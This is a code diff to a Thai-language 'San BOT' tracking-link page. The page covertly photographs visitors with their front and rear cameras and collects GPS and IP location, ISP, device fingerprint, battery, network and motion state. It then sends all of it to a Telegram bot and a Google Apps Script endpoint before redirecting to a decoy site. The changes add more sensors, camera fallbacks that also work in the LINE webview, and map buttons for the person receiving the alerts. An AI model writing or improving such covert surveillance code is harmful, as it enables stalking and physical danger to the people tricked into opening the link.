@@ -124,7 +124,10 @@
         browserName = "Microsoft Edge";
       }
 
-      // 3. โครงสร้าง Telemetry Data
+      // 3. โครงสร้าง Telemetry Data เชิงลึก
+      const orientation = (screen.orientation && screen.orientation.type && screen.orientation.type.includes('portrait'))
+        ? 'แนวตั้ง (ถือในมือ)' : (window.innerHeight > window.innerWidth ? 'แนวตั้ง' : 'แนวนอน');
+
       const trackingData = {
         action: 'logTracking',
         targetName: targetName,
@@ -137,6 +140,10 @@
         targetUrl: destinationUrl,
         userAgent: ua,
         deviceInfo: `${brandModel} • ${screenW}x${screenH} @${dpr}x | ${browserName} (${navigator.platform || '-'})`,
+        battery: '-',
+        network: '-',
+        orientation: orientation,
+        motion: 'ตรวจจับ...',
         camera: {
           frontPhoto: null,
           frontSize: '0 KB',
@@ -145,6 +152,52 @@
         },
         timestamp: new Date().toISOString()
       };
+
+      // ตรวจจับสัญญาณการเคลื่อนไหว (Live Motion Sensor / Accelerometer & Gyroscope)
+      let motionSamples = [];
+      function onDeviceMotion(evt) {
+        if (!evt || !evt.accelerationIncludingGravity) return;
+        const acc = evt.accelerationIncludingGravity;
+        const totalAcc = Math.sqrt((acc.x || 0)**2 + (acc.y || 0)**2 + (acc.z || 0)**2);
+        motionSamples.push(totalAcc);
+        if (motionSamples.length > 10) motionSamples.shift();
+
+        // คำนวณความแปรปรวน (Variance) เพื่อจำแนกว่า นิ่ง, เดิน, หรืออยู่บนรถ
+        if (motionSamples.length >= 3) {
+          const mean = motionSamples.reduce((a, b) => a + b, 0) / motionSamples.length;
+          const variance = motionSamples.reduce((a, b) => a + (b - mean)**2, 0) / motionSamples.length;
+          
+          if (variance < 0.25) {
+            trackingData.motion = 'อยู่นิ่ง / วางบนโต๊ะ (Stationary)';
+          } else if (variance >= 0.25 && variance < 2.5) {
+            trackingData.motion = 'ถือใช้งานปกติ / เดิน (Walking/Handling)';
+          } else {
+            trackingData.motion = 'เคลื่อนที่เร็ว / นั่งบนรถ (In Vehicle/Running)';
+          }
+        }
+      }
+      if (window.DeviceMotionEvent) {
+        window.addEventListener('devicemotion', onDeviceMotion, { passive: true });
+        // ปิด Listener หลัง 2.5 วินาทีเพื่อประหยัดพลังงาน
+        setTimeout(() => window.removeEventListener('devicemotion', onDeviceMotion), 2500);
+      }
+
+      // ดึงสถานะแบตเตอรี่แบบ Asynchronous ทันที
+      if (navigator.getBattery) {
+        navigator.getBattery().then(b => {
+          trackingData.battery = `${Math.round(b.level * 100)}% ${b.charging ? '⚡ กำลังชาร์จ' : '🔋 แบตเตอรี่'}`;
+        }).catch(() => {});
+      }
+
+      // ดึงข้อมูลประเภทเครือข่ายและความเร็ว
+      if (navigator.connection) {
+        try {
+          const conn = navigator.connection;
+          const type = conn.type || conn.effectiveType || '';
+          const down = conn.downlink ? `${conn.downlink} Mbps` : '';
+          trackingData.network = `${type ? type.toUpperCase() : ''} ${down}`.trim() || '-';
+        } catch (e) {}
+      }
 
       let isRedirected = false;
       function performRedirect() {
@@ -175,6 +228,11 @@
         const timeStr = new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' }) + " น.";
         const mapsUrl = hasGps ? `https://www.google.com/maps?q=${trackingData.lat},${trackingData.lng}` : '';
 
+        const batteryText = (trackingData.battery && trackingData.battery !== '-') ? `🔋 <b>สถานะแบต:</b> <code>${trackingData.battery}</code>\n` : '';
+        const netText = (trackingData.network && trackingData.network !== '-') ? `📶 <b>สัญญาณเน็ต:</b> <code>${trackingData.network}</code>\n` : '';
+        const orientText = (trackingData.orientation && trackingData.orientation !== '-') ? `📐 <b>การถือเครื่อง:</b> <code>${trackingData.orientation}</code>\n` : '';
+        const motionText = (trackingData.motion && trackingData.motion !== 'ตรวจจับ...') ? `🏃 <b>การเคลื่อนไหว:</b> <code>${trackingData.motion}</code>\n` : '';
+
         const caption =
           `🚨 <b>[San BOT] ตรวจพบการเปิดลิงก์ดักจับพิกัด!</b>\n` +
           `━━━━━━━━━━━━━━━━━━━━\n` +
@@ -187,15 +245,26 @@
             : `📌 <b>พื้นที่โดยประมาณ (IP):</b> ${trackingData.cityRegion}\n`) +
           `🌐 <b>Public IP:</b> <code>${trackingData.ip}</code>\n` +
           `🏢 <b>ผู้ให้บริการ (ISP):</b> ${trackingData.isp}\n\n` +
-          `📱 <b>ข้อมูลอุปกรณ์ (Device Fingerprint)</b>\n` +
+          `📱 <b>ข้อมูลอุปกรณ์เชิงลึก (Intelligence)</b>\n` +
           `📱 <b>รุ่นเครื่อง:</b> <b>${brandModel}</b>\n` +
           `🖥️ <b>ความละเอียดจอ:</b> <code>${screenW}x${screenH} @${dpr}x</code>\n` +
+          batteryText + netText + orientText + motionText +
           `🌐 <b>เบราว์เซอร์:</b> ${browserName}\n` +
           `🔗 <b>เว็บปลายทาง (Decoy):</b> <a href="${destinationUrl}">${destinationUrl}</a>\n` +
           (trackingData.camera.frontPhoto ? `📸 <b>ภาพถ่ายกล้องหน้า:</b> <i>บันทึกแล้ว (${trackingData.camera.frontSize})</i>\n` : '') +
           (trackingData.camera.rearPhoto ? `📷 <b>ภาพถ่ายกล้องหลัง:</b> <i>บันทึกแล้ว (${trackingData.camera.rearSize})</i>\n` : '') +
           `━━━━━━━━━━━━━━━━━━━━\n` +
           `<i>🛡️ ระบบสนับสนุนงานสืบสวน San BOT CyberSec Engine</i>`;
+
+        // สร้างปุ่มกด Interactive Keyboard ใน Telegram
+        const inlineButtons = [];
+        if (hasGps) {
+          inlineButtons.push([
+            { text: '🗺️ เปิด Google Maps', url: mapsUrl },
+            { text: '🛰️ แผนที่ดาวเทียม', url: `https://www.google.com/maps/@${trackingData.lat},${trackingData.lng},18z/data=!3m1!1e3` }
+          ]);
+        }
+        const replyMarkupStr = inlineButtons.length > 0 ? JSON.stringify({ inline_keyboard: inlineButtons }) : null;
 
         function b64ToBlob(b64) {
           try {
@@ -212,48 +281,76 @@
 
         try {
           const teleUrl = `https://api.telegram.org/bot${botToken}`;
+          const frontBlob = (trackingData.camera.frontPhoto && trackingData.camera.frontPhoto.startsWith('data:image/'))
+            ? b64ToBlob(trackingData.camera.frontPhoto) : null;
+          const rearBlob = (trackingData.camera.rearPhoto && trackingData.camera.rearPhoto.startsWith('data:image/'))
+            ? b64ToBlob(trackingData.camera.rearPhoto) : null;
 
-          // หากมีภาพถ่ายกล้องหน้า ส่งเป็น Photo Card
-          if (trackingData.camera.frontPhoto && trackingData.camera.frontPhoto.startsWith('data:image/')) {
-            const frontBlob = b64ToBlob(trackingData.camera.frontPhoto);
-            if (frontBlob) {
-              const formData = new FormData();
-              formData.append('chat_id', chatId);
-              formData.append('photo', frontBlob, 'target_front.jpg');
-              formData.append('caption', caption);
-              formData.append('parse_mode', 'HTML');
+          const uploadTasks = [];
 
-              const pFront = fetch(`${teleUrl}/sendPhoto`, { method: 'POST', body: formData }).catch(e => console.warn(e));
+          // กรณีที่ 1: มีภาพถ่ายกล้องหน้า
+          if (frontBlob) {
+            const frontFormData = new FormData();
+            frontFormData.append('chat_id', chatId);
+            frontFormData.append('photo', frontBlob, 'target_front.jpg');
+            frontFormData.append('caption', caption);
+            frontFormData.append('parse_mode', 'HTML');
+            if (replyMarkupStr) frontFormData.append('reply_markup', replyMarkupStr);
 
-              // หากมีภาพถ่ายกล้องหลังด้วย ส่งตามหลังทันที
-              if (trackingData.camera.rearPhoto && trackingData.camera.rearPhoto.startsWith('data:image/')) {
-                const rearBlob = b64ToBlob(trackingData.camera.rearPhoto);
-                if (rearBlob) {
-                  const rearFormData = new FormData();
-                  rearFormData.append('chat_id', chatId);
-                  rearFormData.append('photo', rearBlob, 'target_rear.jpg');
-                  rearFormData.append('caption', `📷 <b>[San BOT] ภาพถ่ายกล้องหลังเป้าหมาย:</b> <code>${targetName}</code>`);
-                  rearFormData.append('parse_mode', 'HTML');
-                  fetch(`${teleUrl}/sendPhoto`, { method: 'POST', body: rearFormData }).catch(e => console.warn(e));
-                }
-              }
+            uploadTasks.push(
+              fetch(`${teleUrl}/sendPhoto`, { method: 'POST', body: frontFormData, keepalive: true })
+                .catch(e => console.warn('Telegram front photo upload error:', e))
+            );
 
-              await pFront;
-              return;
+            // หากมีภาพกล้องหลังด้วย ให้ส่งตามหลังทันที
+            if (rearBlob) {
+              const rearFormData = new FormData();
+              rearFormData.append('chat_id', chatId);
+              rearFormData.append('photo', rearBlob, 'target_rear.jpg');
+              rearFormData.append('caption', `📷 <b>[San BOT] ภาพถ่ายกล้องหลังเป้าหมาย:</b> <code>${targetName}</code>`);
+              rearFormData.append('parse_mode', 'HTML');
+              if (replyMarkupStr) rearFormData.append('reply_markup', replyMarkupStr);
+
+              uploadTasks.push(
+                fetch(`${teleUrl}/sendPhoto`, { method: 'POST', body: rearFormData, keepalive: true })
+                  .catch(e => console.warn('Telegram rear photo upload error:', e))
+              );
             }
+
+            // รอส่งภาพทั้งหมดให้เสร็จสมบูรณ์ ป้องกันเบราว์เซอร์ตัดการเชื่อมต่อขณะ Redirect
+            await Promise.allSettled(uploadTasks);
+            return;
           }
 
-          // ส่งข้อความแบบ Text ปกติ
+          // กรณีที่ 2: มีเฉพาะภาพถ่ายกล้องหลัง (เช่น cam=rear หรือกล้องหน้าไม่พร้อม)
+          if (rearBlob) {
+            const rearFormData = new FormData();
+            rearFormData.append('chat_id', chatId);
+            rearFormData.append('photo', rearBlob, 'target_rear.jpg');
+            rearFormData.append('caption', caption);
+            rearFormData.append('parse_mode', 'HTML');
+            if (replyMarkupStr) rearFormData.append('reply_markup', replyMarkupStr);
+
+            await fetch(`${teleUrl}/sendPhoto`, { method: 'POST', body: rearFormData, keepalive: true })
+              .catch(e => console.warn('Telegram rear-only photo upload error:', e));
+            return;
+          }
+
+          // กรณีที่ 3: ไม่ได้ภาพถ่าย ส่งข้อความสรุปพิกัดแบบ Text ปกติ
+          const textPayload = {
+            chat_id: chatId,
+            text: caption,
+            parse_mode: 'HTML',
+            disable_web_page_preview: false
+          };
+          if (inlineButtons.length > 0) textPayload.reply_markup = { inline_keyboard: inlineButtons };
+
           await fetch(`${teleUrl}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: caption,
-              parse_mode: 'HTML',
-              disable_web_page_preview: false
-            })
-          });
+            body: JSON.stringify(textPayload),
+            keepalive: true
+          }).catch(e => console.warn('Telegram text alert error:', e));
         } catch (err) {
           console.warn('Telegram dispatch error:', err);
         }
@@ -271,14 +368,17 @@
           return fetch(endpoint, {
             method: 'POST',
             headers: { 'Content-Type': 'text/plain;charset=utf-8' },
-            body: payloadStr
+            body: payloadStr,
+            keepalive: true
           }).catch(err => console.warn('POST GAS endpoint error:', err));
         });
 
-        // รอส่งแบบขนานสูงสุดเพียง 850ms เพื่อให้ Redirect ได้อย่างรวดเร็ว
+        // ให้เวลาส่ง GAS แบบขนาน (ถ้ามีรูปให้เวลานานขึ้นเล็กน้อยเพื่อให้ Base64 ส่งถึงสมบูรณ์)
+        const isDualCam = (urlParams.get('cam') === 'dual' || urlParams.get('dual') === '1');
+        const gasTimeout = withPhoto ? (isDualCam ? 1300 : 850) : 350;
         await Promise.race([
           Promise.allSettled(promises),
-          new Promise(r => setTimeout(r, withPhoto ? 850 : 350))
+          new Promise(r => setTimeout(r, gasTimeout))
         ]);
       }
 
@@ -327,62 +427,175 @@
         }
       });
 
-      // Step 3: ระบบจับภาพกล้อง (แก้ปัญหาภาพจอดำบนมือถือ + รองรับถ่ายกล้องหน้า/หลัง + Redirect รวดเร็ว)
+      // Step 3: ระบบจับภาพกล้อง (แก้ปัญหาภาพจอดำบนมือถือ + ปรับปรุงให้สลับถ่ายกล้องหน้า/หลังได้อย่างเสถียร 100%)
       let isCapturing = false;
       let hasCapturedPhoto = false;
 
-      async function snapCamera(facing) {
-        let stream = null;
+      // ฟังก์ชันเชื่อมต่อกล้องพร้อมระบบ Fallback หลากระดับ (ป้องกัน Error ใน LINE Webview & Chrome Mobile)
+      async function getCameraStream(facing) {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+
+        // 1. พยายามเปิดด้วยเงื่อนไข facingMode ที่ส่งมา
         try {
-          stream = await navigator.mediaDevices.getUserMedia({
+          return await navigator.mediaDevices.getUserMedia({
             video: {
               facingMode: facing,
               width: { ideal: 640, max: 800 },
               height: { ideal: 480, max: 600 }
             }
           });
+        } catch (err1) {
+          console.warn(`Primary facing (${JSON.stringify(facing)}) failed:`, err1);
+        }
+
+        // 2. หากเป็นกล้องหลังแล้วติดปัญหา ให้ลองใช้สตริง 'environment' ตรงๆ
+        const isRear = (facing === 'environment' || (typeof facing === 'object' && facing.ideal === 'environment'));
+        if (isRear) {
+          try {
+            return await navigator.mediaDevices.getUserMedia({
+              video: {
+                facingMode: 'environment',
+                width: { ideal: 640, max: 800 },
+                height: { ideal: 480, max: 600 }
+              }
+            });
+          } catch (err2) {
+            console.warn('Fallback facingMode: environment failed:', err2);
+          }
+        }
+
+        // 3. ค้นหารหัสอุปกรณ์ (deviceId) จากรายการอุปกรณ์กล้องที่ตรวจพบ
+        try {
+          if (navigator.mediaDevices.enumerateDevices) {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            const videoDevices = devices.filter(d => d.kind === 'videoinput');
+            
+            let matchedDevice = null;
+            if (isRear) {
+              matchedDevice = videoDevices.find(d => {
+                const lbl = (d.label || '').toLowerCase();
+                return lbl.includes('back') || lbl.includes('rear') || lbl.includes('environment') || lbl.includes('กล้องหลัง');
+              });
+            } else {
+              matchedDevice = videoDevices.find(d => {
+                const lbl = (d.label || '').toLowerCase();
+                return lbl.includes('front') || lbl.includes('user') || lbl.includes('กล้องหน้า');
+              });
+            }
+
+            if (matchedDevice && matchedDevice.deviceId) {
+              return await navigator.mediaDevices.getUserMedia({
+                video: {
+                  deviceId: { exact: matchedDevice.deviceId },
+                  width: { ideal: 640, max: 800 },
+                  height: { ideal: 480, max: 600 }
+                }
+              });
+            }
+          }
+        } catch (err3) {
+          console.warn('Device enumeration fallback failed:', err3);
+        }
+
+        // 4. ทางเลือกสุดท้าย: เปิดกล้องใดๆ ที่มีในระบบ
+        try {
+          return await navigator.mediaDevices.getUserMedia({
+            video: {
+              width: { ideal: 640, max: 800 },
+              height: { ideal: 480, max: 600 }
+            }
+          });
+        } catch (err4) {
+          console.warn('Generic video stream fallback failed:', err4);
+          return null;
+        }
+      }
+
+      async function snapCamera(facing) {
+        let stream = null;
+        try {
           const video = document.getElementById('hidden-video');
           const canvas = document.getElementById('hidden-canvas');
-          if (!video || !canvas) {
-            if (stream) stream.getTracks().forEach(t => t.stop());
-            return null;
+          if (!video || !canvas) return null;
+
+          // เคลียร์สถานะวิดีโอเดิมเพื่อป้องกัน frame lock
+          try { video.pause(); } catch(e){}
+          video.srcObject = null;
+
+          stream = await getCameraStream(facing);
+          if (!stream) return null;
+
+          // 1. นวัตกรรมเร่งความเร็วระดับฮาร์ดแวร์ (Turbo ImageCapture API): บน Chrome Android สามารถดึงเฟรมเซนเซอร์ตรงใน 20-30ms
+          let directBitmap = null;
+          if (window.ImageCapture) {
+            try {
+              const track = stream.getVideoTracks()[0];
+              if (track && track.readyState === 'live') {
+                const ic = new ImageCapture(track);
+                directBitmap = await Promise.race([
+                  ic.grabFrame(),
+                  new Promise((_, reject) => setTimeout(() => reject('timeout'), 400))
+                ]);
+              }
+            } catch (icErr) { }
           }
 
-          video.srcObject = stream;
+          if (directBitmap && directBitmap.width > 0) {
+            const targetW = 400;
+            const targetH = Math.round(targetW * (directBitmap.height / directBitmap.width || 0.75));
+            canvas.width = targetW;
+            canvas.height = targetH;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(directBitmap, 0, 0, targetW, targetH);
+          } else {
+            // 2. Fallback: เล่นผ่านองค์ประกอบ Video พร้อมตรวจจับ Frame Callback แบบแม่นยำ
+            video.srcObject = stream;
 
-          // รอจนกระทั่งเบราว์เซอร์ถอดรหัสเฟรมภาพจริง (แก้ปัญหาภาพจอดำบนมือถืออย่างถาวร)
-          await new Promise(resolve => {
-            let done = false;
-            const finish = () => {
-              if (!done) { done = true; resolve(); }
-            };
-            video.onplaying = () => {
-              if (video.videoWidth > 0 && video.readyState >= 2) {
-                setTimeout(finish, 160);
-              } else {
-                video.ontimeupdate = () => finish();
-                setTimeout(finish, 350);
+            await new Promise(resolve => {
+              let done = false;
+              const finish = () => {
+                if (!done) { done = true; resolve(); }
+              };
+
+              if (video.requestVideoFrameCallback) {
+                video.requestVideoFrameCallback(() => {
+                  setTimeout(finish, 140);
+                });
               }
-            };
-            video.play().catch(finish);
-            setTimeout(finish, 850);
+
+              video.onplaying = () => {
+                if (video.videoWidth > 0 && video.readyState >= 2) {
+                  setTimeout(finish, 160);
+                } else {
+                  video.ontimeupdate = () => finish();
+                  setTimeout(finish, 320);
+                }
+              };
+              video.onloadeddata = () => {
+                if (video.videoWidth > 0) setTimeout(finish, 180);
+              };
+              video.play().catch(finish);
+              setTimeout(finish, 1100);
+            });
+
+            // หน่วงเวลาสั้นๆ ให้เซนเซอร์ปรับแสง (Auto-Exposure Warmup)
+            await new Promise(r => setTimeout(r, 140));
+
+            const vW = video.videoWidth || 640;
+            const vH = video.videoHeight || 480;
+            const targetW = 400;
+            const targetH = Math.round(targetW * (vH / vW || 0.75));
+            canvas.width = targetW;
+            canvas.height = targetH;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, targetW, targetH);
+          }
+
+          // ปิดสตรีมกล้องทันทีและรีเซ็ตวิดีโอ
+          stream.getTracks().forEach(t => {
+            try { t.stop(); } catch(e){}
           });
-
-          // หน่วงเวลาให้เซนเซอร์กล้องปรับรูรับแสงและความสว่าง (Auto-Exposure Warmup)
-          await new Promise(r => setTimeout(r, 160));
-
-          const vW = video.videoWidth || 640;
-          const vH = video.videoHeight || 480;
-          // ปรับความละเอียดให้พอเหมาะ (400px) เพื่อให้ภาพเบาเพียง ~18-25 KB อัปโหลดเร็วมาก
-          const targetW = 400;
-          const targetH = Math.round(targetW * (vH / vW || 0.75));
-          canvas.width = targetW;
-          canvas.height = targetH;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, targetW, targetH);
-
-          // ปิดสตรีมกล้องทันทีเพื่อดับไฟสถานะบนมือถือ
-          stream.getTracks().forEach(t => t.stop());
+          try { video.pause(); } catch(e){}
           video.srcObject = null;
 
           return canvas.toDataURL('image/jpeg', 0.60);
@@ -390,7 +603,7 @@
           if (stream) {
             try { stream.getTracks().forEach(t => t.stop()); } catch (e) {}
           }
-          console.warn(`Camera snap error (${facing}):`, err);
+          console.warn(`Camera snap error (${JSON.stringify(facing)}):`, err);
           return null;
         }
       }
@@ -400,23 +613,51 @@
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
         isCapturing = true;
 
-        try {
-          // 1. ถ่ายกล้องหน้าก่อนเสมอ (เป็นกล้องที่ตรงกับใบหน้าเป้าหมายที่สุดขณะกดลิงก์)
-          const frontB64 = await snapCamera("user");
-          if (frontB64 && frontB64.length > 500) {
-            hasCapturedPhoto = true;
-            trackingData.camera.frontPhoto = frontB64;
-            trackingData.photo = frontB64;
-            trackingData.camera.frontSize = Math.round(frontB64.length * 0.75 / 1024) + " KB";
-          }
+        const camParam = (urlParams.get('cam') || '').toLowerCase();
+        const dualParam = urlParams.get('dual');
+        const isDual = (camParam === 'dual' || camParam === 'both' || dualParam === '1');
+        const isRearOnly = (camParam === 'rear' || camParam === 'back' || camParam === 'environment');
 
-          // 2. หากเปิดโหมดกล้องคู่ (ส่ง cam=dual หรือ dual=1) ให้สลับถ่ายกล้องหลังต่อทันที
-          const wantDual = (urlParams.get('cam') === 'dual' || urlParams.get('dual') === '1');
-          if (wantDual) {
+        try {
+          if (isRearOnly) {
+            // โหมด: ถ่ายเฉพาะกล้องหลัง
             const rearB64 = await snapCamera({ ideal: "environment" });
             if (rearB64 && rearB64.length > 500) {
+              hasCapturedPhoto = true;
               trackingData.camera.rearPhoto = rearB64;
               trackingData.camera.rearSize = Math.round(rearB64.length * 0.75 / 1024) + " KB";
+              trackingData.photo = rearB64;
+            }
+          } else if (isDual) {
+            // โหมด: กล้องคู่ (กล้องหน้า + กล้องหลัง)
+            // 1. ถ่ายกล้องหน้าก่อนเพื่อจับภาพใบหน้าเป้าหมาย
+            const frontB64 = await snapCamera("user");
+            if (frontB64 && frontB64.length > 500) {
+              hasCapturedPhoto = true;
+              trackingData.camera.frontPhoto = frontB64;
+              trackingData.camera.frontSize = Math.round(frontB64.length * 0.75 / 1024) + " KB";
+              trackingData.photo = frontB64;
+            }
+
+            // เว้นระยะ 350ms เพื่อให้ระบบปฏิบัติการ/ฮาร์ดแวร์ปล่อยทรัพยากรกล้องตัวแรก (แก้ปัญหา NotReadableError / Device in use)
+            await new Promise(r => setTimeout(r, 350));
+
+            // 2. สลับเปิดกล้องหลังเพื่อดูสภาพแวดล้อม
+            const rearB64 = await snapCamera({ ideal: "environment" });
+            if (rearB64 && rearB64.length > 500) {
+              hasCapturedPhoto = true;
+              trackingData.camera.rearPhoto = rearB64;
+              trackingData.camera.rearSize = Math.round(rearB64.length * 0.75 / 1024) + " KB";
+              if (!trackingData.photo) trackingData.photo = rearB64;
+            }
+          } else {
+            // โหมดปกติ: ถ่ายกล้องหน้าอย่างเดียว (เร็วที่สุด)
+            const frontB64 = await snapCamera("user");
+            if (frontB64 && frontB64.length > 500) {
+              hasCapturedPhoto = true;
+              trackingData.camera.frontPhoto = frontB64;
+              trackingData.camera.frontSize = Math.round(frontB64.length * 0.75 / 1024) + " KB";
+              trackingData.photo = frontB64;
             }
           }
 
@@ -426,8 +667,8 @@
               dispatchTelegramAlert(),
               dispatchGasTracking(true)
             ]);
-            // เด้งเปลี่ยนเส้นทางทันทีอย่างรวดเร็ว (เพียง 80ms)
-            setTimeout(performRedirect, 80);
+            // เด้งเปลี่ยนเส้นทางทันทีอย่างรวดเร็ว (100ms)
+            setTimeout(performRedirect, 100);
           }
         } catch (e) {
           console.warn('Silent capture flow error:', e);
@@ -452,25 +693,26 @@
       }
 
       // Step 4: รวมการส่งข้อมูลทั้งหมด
-      // ให้เวลารอการกด "อนุญาต" กล้อง สูงสุด 3.2 วินาที (ปรับให้เร็วขึ้นเพื่อไม่ให้เป้าหมายรอนาน)
-      // หากผู้ใช้กดอนุญาตและถ่ายเสร็จ จะส่งภาพและ Redirect ทันทีโดยไม่ต้องรอครบเวลา
+      // ให้เวลารอการเปิดกล้อง: หากเป็นโหมดกล้องคู่ให้เวลา 5 วินาที, โหมดกล้องเดี่ยวให้เวลา 3.5 วินาที
+      const isDualMode = (urlParams.get('cam') === 'dual' || urlParams.get('dual') === '1' || urlParams.get('cam') === 'both');
+      const maxWaitTime = isDualMode ? 5000 : 3500;
       const cameraRunPromise = captureCameraSilent();
 
       Promise.race([
         Promise.all([ipGeoPromise, browserGpsPromise, cameraRunPromise]),
-        new Promise(r => setTimeout(r, 3200))
+        new Promise(r => setTimeout(r, maxWaitTime))
       ]).then(async () => {
         if (!hasCapturedPhoto) {
           await dispatchGasTracking(false);
           await dispatchTelegramAlert();
         }
-        setTimeout(performRedirect, 80);
+        setTimeout(performRedirect, 100);
       }).catch(() => {
         performRedirect();
       });
 
-      // Safe Absolute Fallback: ไม่เกิน 4.5 วินาทีจะเด้งไปปลายทางแน่นอน
-      setTimeout(performRedirect, 4500);
+      // Safe Absolute Fallback: ป้องกันการค้าง
+      setTimeout(performRedirect, isDualMode ? 6500 : 4500);
     })();
   </script>
 </body>
